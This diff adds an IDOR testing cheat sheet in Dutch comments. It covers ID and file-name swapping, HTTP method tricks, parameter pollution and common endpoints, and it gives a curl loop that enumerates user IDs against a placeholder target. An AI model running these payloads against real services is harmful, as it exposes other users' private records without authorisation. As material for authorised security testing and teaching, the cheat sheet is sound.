@@ -1,0 +1,31 @@
+# IDOR - Insecure Direct Object Reference
+# === Numerieke ID manipulatie ===
+# Origineel: GET /api/user/profile?id=1337
+# Probeer: GET /api/user/profile?id=1338
+# GET /api/user/profile?id=1336
+# GET /api/user/profile?id=1
+# === Document/file IDOR ===
+# Origineel: GET /docs/?f=report_1337.pdf
+# Probeer: GET /docs/?f=report_1338.pdf
+# GET /docs/?f=report_1.pdf
+# === UUID/GUID IDOR ===
+# Soms voorspelbaar (v1 UUID = timestamp-based)
+# Zoek UUIDs in: HTML source, API responses, JavaScript files
+# === HTTP method IDOR ===
+# GET mag niet, maar PUT/DELETE/PATCH wel?
+# GET /api/user/1337 -> 403
+# DELETE /api/user/1337 -> 200
+# === Parameter pollution ===
+# GET /api/user?id=1337&id=1338
+# GET /api/user?id[]=1337&id[]=1338
+# === Burp Intruder brute-force ===
+# Payload type: Numbers, range 1-10000
+# Filter op: response size, status code, specifieke string
+# curl one-liner:
+# for i in $(seq 1 1000); do echo "$i: $(curl -s http://target/api/user?id=$i -w '%{size_download}')"; done
+# === Veelgebruikte locaties ===
+# /api/user/{id}, /api/order/{id}, /api/invoice/{id}
+# /download?file={id}, /receipt?order_id={id}
+# /admin/user/edit/{id}, /messages/{id}
+# Tip: Altijd horizontale EN verticale IDOR testen (eigen user vs admin)
+# Tip: Check of API endpoints zonder auth bereikbaar zijn
